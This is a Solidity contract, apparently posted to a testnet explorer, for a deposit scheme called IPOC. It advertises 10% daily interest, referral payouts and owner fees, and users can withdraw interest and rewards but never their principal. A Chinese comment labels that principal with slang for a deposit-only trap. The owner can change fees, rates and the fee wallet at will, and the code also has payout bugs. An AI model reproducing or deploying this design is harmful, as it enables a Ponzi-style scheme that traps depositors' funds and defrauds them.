/**
 *Submitted for verification at testnet.snowtrace.io on 2023-02-28
*/

/// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract IPOC is Ownable {
    mapping(address => uint256) private _userPosition; // 仓位(计息金额(貔貅的本金))
    mapping(address => uint256) private _userInterestRate; // 当前利率
    mapping(address => uint256) private _userDepositTime; // 最后入金时间戳
    mapping(address => uint256) private _userEarendInterest; // 已归档收益
    mapping(address => uint256) private _userInvitationRewards;

    uint256 private DECIMAL = 1e10;

    address private _devWallet; // 收税钱包

    uint256 private _devFee = 10 * DECIMAL / 100; // 项目方税率
    uint256 private _refRate = 10 * DECIMAL / 100; // 邀请返利比例
    uint256 private _defaultDailyAPR = 10 * DECIMAL / 100 ; // 默认日利率
    uint256 private _defaultInterestRatePerSecond;
    bool private isLaunched = false;
    constructor(){
        _defaultInterestRatePerSecond = _defaultDailyAPR / 86400;
        _devWallet = msg.sender;
    }
    
    

    // public write functions
    // 入金/加仓  (判断ref仓位)
    function deposit(address ref) public payable{
        require(isLaunched, 'Not launched yet');
        require(msg.value != 0, 'No deposit value found');
        require(_userPosition[msg.sender] == 0, 'Each wallet can only participate once.');
        //msg.value  wei;
        uint256 value = msg.value;
        uint256 devFee = value * _devFee / DECIMAL;
        uint256 refReward = value * _refRate / DECIMAL;

        payable(_devWallet).transfer(devFee);
        
        if (ref != address(0)){
            // if(_userPosition[msg.sender] == 0) {
            if(_userPosition[ref] > 0){
                _userInvitationRewards[ref] += refReward;
            }
            // }
            // else if(_userPosition[msg.sender] / value > 10){
            //     _incrinterestRate(msg.sender);
            // }
        }

        // if(_userPosition[msg.sender] > 0){
        //     _calcinterest(msg.sender);
        // }

        _userPosition[msg.sender] += value;
        _userDepositTime[msg.sender] = block.timestamp;
        _userInterestRate[msg.sender] = _defaultDailyAPR;
    }

    // 收益复投
    function interestToPosition() public {
        require(isLaunched, 'Not launched yet');
        require(_userPosition[msg.sender] > 0, 'No positions held by this address.');
        _calcInterest(msg.sender);
        require(_userEarendInterest[msg.sender] > 0, 'No earned interests.');

        uint256 interest = _userEarendInterest[msg.sender];
        uint256 devFee = interest / 10;
        interest -= devFee;
        payable(_devWallet).transfer(devFee);

        // if (_userPosition[msg.sender] / _userEarendInterest[msg.sender] >= 10){
        //     _incrInterestRate(msg.sender);
        // }

        if(_userEarendInterest[msg.sender] * 100 / _userPosition[msg.sender] >= 10){
            _incrInterestRate(msg.sender);
        }

        _userPosition[msg.sender] += interest;
        _userEarendInterest[msg.sender] = 0;
        // require()
    }

    // 提现收益
    function withdraw() public{
        require(isLaunched, 'Not launched yet');
        require(_userPosition[msg.sender] > 0, 'No positions held by this address.');
        _calcInterest(msg.sender);
        require(_userEarendInterest[msg.sender] > 0, 'No earned interests.');
        uint256 interest = _userEarendInterest[msg.sender];
        _userEarendInterest[msg.sender] = 0;
        payable(msg.sender).transfer(interest);
        _decrInterestRate(msg.sender);
    }

    // 提现返利
    function withdrawInvitationRewards() public{
        require(isLaunched, 'Not launched yet');
        require(_userPosition[msg.sender] > 0, 'No positions held by this address.');
        require(_userInvitationRewards[msg.sender] > 0, 'No invitation rewards held by this address.');
        uint256 rewards = _userInvitationRewards[msg.sender];
        _userInvitationRewards[msg.sender] = 0;
        payable(msg.sender).transfer(rewards);
    }

    // public read functions


    // function timestamp() public view returns(uint256){
    //     return block.timestamp;
    // }
    // 获取计息金额
    function getPosition(address user) public view returns(uint256){
        return _userPosition[user];
    }

    // 读取当前可提现金额
    function getWithdrawableAmount(address user) public view returns(uint256){
        uint256 interestPeriod = block.timestamp - _userDepositTime[user];
        uint256 estimateInterest = _userPosition[user] * _defaultInterestRatePerSecond * interestPeriod / DECIMAL;
        return estimateInterest;
    }

    // 读取当前利率
    function getInterestRate(address user) public view returns(uint256){
        if(_userInterestRate[user] == 0){
            return _defaultDailyAPR;
        }
        return _userInterestRate[user];
    }

    // 读取返利余额
    function getInvitationRewards(address user) public view returns(uint256){
        return _userInvitationRewards[user];
    }

    // owner functions
    function launch() public onlyOwner{
        require(_devWallet != address(0), '???');
        isLaunched = true;
    }

    function setDevFee(uint256 rate) public onlyOwner{
        _devFee = rate * DECIMAL / 100; 
    }

    function setRefRate(uint256 rate) public onlyOwner{
        _refRate = rate * DECIMAL / 100;
    }

    function setDevWallet(address wallet) public onlyOwner{
        _devWallet = wallet;
    }

    function setAPR(uint256 rate) public onlyOwner{
        _defaultDailyAPR = rate * DECIMAL / 100;
        _defaultInterestRatePerSecond = _defaultDailyAPR / 86400;
    }

    // internal functions
    function _calcInterest(address user) internal {
        // uint256 interestPeriod = block.timestamp - _userDepositTime[user];
        // uint256 earnedInterest = _userPosition[user] * _defaultInterestRatePerSecond * interestPeriod / DECIMAL;
        uint256 earnedInterest = getWithdrawableAmount(user);
        _userEarendInterest[user] += earnedInterest;
        _userDepositTime[msg.sender] = block.timestamp;
    }

    function _incrInterestRate(address user) internal{
        uint256 newInterestRate = _userInterestRate[user] * 102 / 100;
        _userInterestRate[user] = newInterestRate;
    }

    function _decrInterestRate(address user) internal {
        uint256 newInterestRate = _userInterestRate[user] * 80 / 100;
        _userInterestRate[user] = newInterestRate;
    }
}